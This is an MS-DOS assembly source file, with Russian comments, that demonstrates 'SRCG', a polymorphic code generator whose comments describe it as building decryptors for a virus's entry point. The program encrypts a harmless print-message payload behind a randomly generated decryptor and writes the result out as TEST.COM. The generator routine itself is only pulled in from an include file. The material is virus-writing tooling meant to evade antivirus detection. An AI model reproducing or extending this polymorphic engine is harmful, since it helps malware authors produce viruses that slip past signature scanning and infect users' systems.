;Демонстрация возможностей полиморфного генератора
;SRCG - S╫ad0W Random Code Generator

.MODEL TINY
.286
.CODE
ORG 100h
.STARTUP

		push ds
		push 0
		pop ds
                mov ax,ds:[46Ch]
                mov word ptr es:RndData,ax
                mov ax,ds:[46Eh]
                mov word ptr es:RndData+2,ax
                pop ds

;SI-смещение entry point вируса от начала декриптора
		mov si,4103h		;смещение от начала сегмента CS
		sub si,103h		;DECRYPTOR_OFFSET
		add si,offset SUXX	;DECRYPTOR

;ES:NN - адрес, где будет создаваться расшифровщик
		mov DECRYPTOR,offset SUXX

;ES:NN - адрес таблицы адресов (равна размеру декриптора/8)
		mov TABLE_ADRESS,offset ADR_USED

;длина декриптора (максимально ~56K-CRYPT_LEN)
		mov CSIZE,4000h

;смещение начала декриптора от начала сегмента DS
		mov DECRYPTOR_OFFSET,103h

;ES:NN - адрес шифруемого кода
		mov CRYPT_ADR,offset PROGRAMM

;смещение начала кода от начала сегмента DS
		mov CODE_OFFSET,4103h

;длина шифруемого кода
		mov CRYPT_LEN,offset PROG_END-offset PROGRAMM

		call SRCG

		mov byte ptr [offset START],0E9h
		mov word ptr [offset START+1],dx
		mov dx,offset FILE_NAME
		xor cx,cx
		mov ah,3Ch
		int 21h
		jc ERROR
		mov bx,ax
		mov dx,offset START
		mov cx,401Ah
		mov ah,40h
		int 21h

ERROR:		mov ax,4C00h
		int 21h


		include srcg.inc


ADR_USED db 800h dup (0)
START: db 3 dup (0)
SUXX db 4000h dup (0)

PROGRAMM:	mov dx,offset TEXT-offset PROGRAMM+4103h
		mov ah,9
		int 21h
		int 20h
TEXT db "*SRCG V1.0*",10,13,"$"
PROG_END:
FILE_NAME: db "TEST.COM",0
END

